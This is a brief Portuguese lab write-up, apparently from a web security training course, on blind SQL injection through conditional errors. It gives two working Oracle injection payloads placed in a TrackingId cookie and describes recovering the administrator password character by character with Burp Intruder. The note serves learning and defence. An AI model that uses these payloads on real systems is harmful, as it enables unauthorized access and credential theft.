# Blind SQL Injection with Conditional Errors

## Objetivo

Explorar Blind SQL Injection utilizando erros da aplicação para descobrir informações do banco.

---

## O que mudou

Diferente do laboratório anterior, aqui a aplicação não retornava mensagens como:

```txt
Welcome back
```

A resposta era baseada em erros:

- Erro → condição verdadeira
- Sem erro → condição falsa

---

## Teste inicial

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Resultado:

- Erro gerado

---

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Resultado:

- Sem erro

---

## Resultado

Foi possível descobrir a senha do usuário `administrator` caractere por caractere utilizando Burp Intruder.

---

## Aprendizado

Mesmo sem mostrar dados diretamente, a aplicação ainda vazava informações através do próprio comportamento dos erros.
